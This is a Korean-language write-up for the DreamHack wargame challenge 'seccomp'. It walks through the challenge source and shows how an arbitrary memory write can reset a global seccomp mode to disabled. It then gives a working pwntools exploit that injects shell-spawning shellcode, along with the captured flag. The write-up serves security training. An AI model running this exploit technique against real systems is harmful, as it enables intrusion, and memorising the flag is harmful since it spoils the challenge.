# [DreamHack] seccomp

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 서버에서 작동하고 있는 서비스(seccomp)의 바이너리와 소스 코드가 주어집니다.
> 프로그램의 취약점을 찾고 익스플로잇해 셸을 획득한 후, “flag” 파일을 읽으세요.
> “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [seccomp.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8549760/seccomp.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/160810652-e179b565-2089-4c61-a1c7-cb13064b6530.png)

## Analysis

### syscall_filter()

```c
int mode = SECCOMP_MODE_STRICT;

int syscall_filter() {
    #define syscall_nr (offsetof(struct seccomp_data, nr))
    #define arch_nr (offsetof(struct seccomp_data, arch))
    
    /* architecture x86_64 */
    #define REG_SYSCALL REG_RAX
    #define ARCH_NR AUDIT_ARCH_X86_64
    struct sock_filter filter[] = {
        /* Validate architecture. */
        BPF_STMT(BPF_LD+BPF_W+BPF_ABS, arch_nr),
        BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, ARCH_NR, 1, 0),
        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
        /* Get system call number. */
        BPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr),
        };
    
    struct sock_fprog prog = {
    .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
    .filter = filter,
        };
    if ( prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1 ) {
        perror("prctl(PR_SET_NO_NEW_PRIVS)\n");
        return -1;
        }
    
    if ( prctl(PR_SET_SECCOMP, mode, &prog) == -1 ) {
        perror("Seccomp filter error\n");
        return -1;
        }
    return 0;
}
```

Seccomp를 설정한다. Strict mode이므로 `read`, `write`, `exit`, `sigreturn` 시스템 콜만 호출 가능하다.

### main()

```c
    shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    while(1) {
        printf("1. Read shellcode\n");
        printf("2. Execute shellcode\n");
        printf("3. Write address\n");
        printf("> ");

        scanf("%d", &idx);

        switch(idx) {
            case 1:
                if(cnt != 0) {
                    exit(0);
                }

                syscall_filter();
                printf("shellcode: ");
                read(0, shellcode, 1024);
                cnt++;
                break;
            case 2:
                sc = (void *)shellcode;
                sc();
                break;
            case 3:
                printf("addr: ");
                scanf("%ld", &addr);
                printf("value: ");
                scanf("%ld", addr);
                break;
            default:
                break;
        }
    }
```

셸코드를 입력하고, 실행할 수 있다. 셸코드를 입력받을 때 `syscall_filter()`를 호출하여 seccomp를 설정한다.

`3. Write address`로 원하는 주소에 원하는 값을 쓸 수 있다. `syscall_filter()`에서 seccomp를 설정할 때 `prctl(PR_SET_SECCOMP, mode, &prog)`를 호출하는데, 이때 `mode`는 전역 변수로 `SECCOMP_MODE_STRICT`로 초기화되어 있다.

```c
/* Valid values for seccomp.mode and prctl(PR_SET_SECCOMP, <mode>) */
#define SECCOMP_MODE_DISABLED	0 /* seccomp is not in use. */
#define SECCOMP_MODE_STRICT	1 /* uses hard-coded filter. */
#define SECCOMP_MODE_FILTER	2 /* uses user-supplied filter. */
```

`seccomp.h`에 위와 같이 seccomp mode의 종류가 매크로로 정의되어 있다. 문제에서 제공되는 AAW를 이용하여 전역 변수 `mode`의 값을 0으로 덮어쓰면 `SECCOMP_MODE_DISABLED`가 되어, `syscall_filter()`가 호출되어도 seccomp가 설정되지 않아서 자유롭게 셸코드를 실행시킬 수 있다.

## Exploit

```python
from pwn import *
context(arch='amd64')

REMOTE = True

if not REMOTE:
    r = process('./release/seccomp')
else:
    r = remote('host1.dreamhack.games', 18083)

sla = r.sendlineafter
sa = r.sendafter

mode = 0x602090  # global var <mode>


# overwrite mode with 0(SECCOMP_MODE_DISABLED)

sla('> ', '3')
sla('addr: ', str(mode))
sla('value: ', str(0))


# execute shellcode

shellcode = asm(shellcraft.sh())

sla('> ', '1')
sa('shellcode: ', shellcode)

sla('> ', '2')


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 18083: Done
[*] Switching to interactive mode
$ cat flag
DH{22b3695a64092efd8845efe7eda784a4}
```
